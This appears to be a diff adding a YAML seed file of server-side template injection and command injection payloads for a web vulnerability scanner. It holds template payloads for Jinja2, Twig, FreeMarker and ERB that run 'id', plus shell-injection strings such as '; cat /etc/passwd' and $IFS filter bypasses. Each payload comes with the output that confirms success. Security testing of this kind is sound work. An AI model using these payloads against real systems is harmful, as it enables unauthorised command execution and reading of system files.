@@ -1,0 +1,61 @@
+# SSTI/CMDi 补充变体
+seeds:
+  ssti:
+    detect:
+      - raw: "{{7*7}}"
+        indicator: "49"
+        ctx: ["all"]
+      - raw: "${7*7}"
+        indicator: "49"
+        ctx: ["all"]
+      - raw: "#{7*7}"
+        indicator: "49"
+        ctx: ["all"]
+      - raw: "{{'a'.upper()}}"
+        indicator: "A"
+        ctx: ["all"]
+      - raw: "{{7**7}}"
+        indicator: "823543"
+        ctx: ["all"]
+      - raw: "[[7*7]]"
+        indicator: "49"
+        ctx: ["all"]
+    blind:
+      - raw: "{{ cycler.__init__.__globals__.os.popen('id').read() }}"
+        indicator: "uid="
+        ctx: ["all"]
+      - raw: "{{['id']|filter('system')|join(',')}}"
+        indicator: "uid="
+        ctx: ["all"]
+      - raw: "${'freemarker.template.utility.Execute'?new()('id')}"
+        indicator: "uid="
+        ctx: ["all"]
+      - raw: "<%= system('id') %>"
+        indicator: "uid="
+        ctx: ["all"]
+  cmdi:
+    output:
+      - raw: "; id"
+        indicator: "uid="
+        ctx: ["all"]
+      - raw: "; whoami"
+        indicator: None
+        ctx: ["all"]
+      - raw: "; uname -a"
+        indicator: "Linux"
+        ctx: ["all"]
+      - raw: "; echo PWNED_$(id)"
+        indicator: "PWNED_"
+        ctx: ["all"]
+      - raw: "; cat /etc/passwd"
+        indicator: "root:"
+        ctx: ["all"]
+      - raw: "$IFS; id"
+        indicator: "uid="
+        ctx: ["all"]
+      - raw: "; ${IFS}id"
+        indicator: "uid="
+        ctx: ["all"]
+      - raw: "; {id,}"
+        indicator: "uid="
+        ctx: ["all"]
